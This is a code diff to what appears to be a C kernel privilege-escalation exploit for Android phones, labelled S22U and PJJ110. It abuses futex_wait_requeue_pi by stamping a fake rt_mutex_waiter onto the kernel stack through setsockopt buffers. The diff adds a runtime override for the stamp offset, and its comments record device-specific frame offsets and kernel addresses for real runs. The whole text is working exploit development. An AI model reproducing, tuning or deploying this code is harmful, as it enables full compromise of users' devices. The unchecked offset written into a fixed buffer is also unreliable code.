@@ -40,9 +40,16 @@ extern atomic_int g_consumer_go;
 
 /* PJJ110: UNMEASURED — S22U exp64 value kept ONLY as a compile placeholder.
  * S22U (5.10.168 native) measured 0x60; PJJ110 (5.10.226) has a different
- * futex_wait_requeue_pi frame (sub #0x70) and different setsockopt frames,
- * so this MUST be re-measured on device before any real run. */
+ * do_futex frame (0x130 vs 0x70) and different sock frames, so this MUST be
+ * re-measured on device before any real run.  Since 2026-08-22 static pass,
+ * the TRUE futex_wait_requeue_pi on PJJ110 is 0x295870 (frame #0x1a0,
+ * rt_waiter=sp+0x90 — IDENTICAL to S22U), so the S22U 0x60 is a sane
+ * baseline; the real value is likely 0x60..0x98.  Override per run with
+ * EXP64_STAMP_OFF=<hex> (no rebuild needed). */
+#ifndef EXP64_STAMP_OFF
 #define EXP64_STAMP_OFF 0x60
+#endif
+static uint64_t exp64_stamp_off = EXP64_STAMP_OFF;
 /* v5.10 rt_mutex_waiter = 80 bytes */
 #define EXP64_WAITER_BYTES 0x50
 /* Native group_source_req = 264 bytes (compat was 260); optlen must match. */
@@ -52,6 +59,11 @@ extern atomic_int g_consumer_go;
 #define EXP64_STAMP_ROUNDS 64
 
 void do_stamp_stack(uint64_t *buf){
+    /* Per-run override: EXP64_STAMP_OFF=<hex> (0x60 default, likely 0x60..0x98). */
+    const char *env_off = getenv("EXP64_STAMP_OFF");
+    if (env_off && env_off[0])
+        exp64_stamp_off = strtoul(env_off, NULL, 16);
+
     int fd = socket(AF_INET6, SOCK_DGRAM, 0);
     uint8_t buffer[EXP64_OPTLEN];
     if (fd < 0) {
@@ -59,7 +71,7 @@ void do_stamp_stack(uint64_t *buf){
         _exit(1);   /* let the parent retry with a fresh child */
     }
     memset(buffer, 0, sizeof(buffer));
-    memcpy(buffer + EXP64_STAMP_OFF, buf, EXP64_WAITER_BYTES);
+    memcpy(buffer + exp64_stamp_off, buf, EXP64_WAITER_BYTES);
 
     /*
      * Probe ONE stamp and report it BEFORE the real loop.  After the last
